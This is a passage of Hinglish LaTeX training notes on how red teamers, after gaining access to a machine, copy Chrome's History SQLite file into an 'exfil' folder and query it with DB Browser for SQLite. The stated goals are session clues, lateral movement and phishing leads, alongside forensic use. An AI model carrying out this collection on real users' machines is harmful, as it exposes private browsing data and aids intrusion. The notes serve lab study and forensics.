      \begin{enumerate}[itemsep=1em]
        \item \textbf{Note:} \textcolor{red}{Note:} Browser history wo data hota hai jo browser automatically save karta hai taaki pata chale user kaunse websites visit kar raha hai.
        \item Isme URLs, visit time stamps, cached data, cookies wagairah stored hote hain.
        \item Red teamers ke liye important hota hai target user ke activities aur intent samajhne ke liye.
        \item \textbf{Note:} \textcolor{red}{Note:} \textbf{DB Browser for SQLite (sqlitebrowser.org)} ek open-source, free GUI tool hai jo SQLite databases ko read, edit aur query karna easy banata hai.
        \item Chrome aur Firefox jaise browsers apna data SQLite format mein store karte hain.
        \item Ye tool allow karta hai kisi bhi SQLite database (jaise browser history files) ko human readable format mein dekhna.
        \item \textbf{Note:} \textcolor{red}{Note:} Chrome browser apni history aur other profile data yaha rakhta hai:
          \begin{tcolorbox}[title=Path]
\begin{lstlisting}
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\History
\end{lstlisting}
          \end{tcolorbox}
        \item Yeh \textbf{History} file SQLite database hota hai.
        \item \textbf{Note:} \textcolor{red}{Note:} Jab red teamers ne target machine pe access le liya, to wo browser history ko analyze karte hain taaki:
          \begin{itemize}
            \item User ke visited websites samajh saken.
            \item Account ya session info ke clues milen.
            \item Lateral movement ya phishing ke liye valuable info mile.
          \end{itemize}
        \item DB Browser for SQLite se wo \textbf{History} file open karte hain aur query karte hain.
        \item
          \begin{tcolorbox}[title=Command]
\begin{lstlisting}
copy "C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\History" D:\exfil\history_copy
\end{lstlisting}
          \end{tcolorbox}
        \item Website se download karo, install karo.
        \item Open DB Browser > Open database > Select copied History file.
        \item Table named \texttt{urls} ya \texttt{visits} me URLs, visit count, last visit time dikhte hain.
        \item SQL queries query tab me run kar sakte hain for filtered info.
        \item \textbf{Note:} \textcolor{red}{Note:} Browser history forensic analysis ke liye important hai.
        \item Suspicious website visit pattern detect karo.
        \item User ke intent aur compromised accounts trace karo.
      \end{enumerate}

      \begin{longtable}{|p{4cm}|p{5cm}|p{5cm}|}
        \hline
        \textbf{Topic} & \textbf{Explanation} & \textbf{Red Team Use} \\
        \hline
        ...
        History File Location & \texttt{AppData\textbackslash Local\textbackslash Google\textbackslash Chrome\textbackslash User Data\textbackslash Default\textbackslash History} & Copy and analyze for intel \\
        \hline
      \end{longtable}

      \begin{enumerate}[itemsep=1em, resume]
        \item Bro, ab toh full clear ho gaya hoga kaise browser history extract karte hain, DB Browser ka use karte hain, aur red team isse apne analysis mein kaise lagata hai. Lab pe try kar, aur agar aur deep query chahiye toh bata dena!
        \item Keep smashing it! ��
      \end{enumerate}
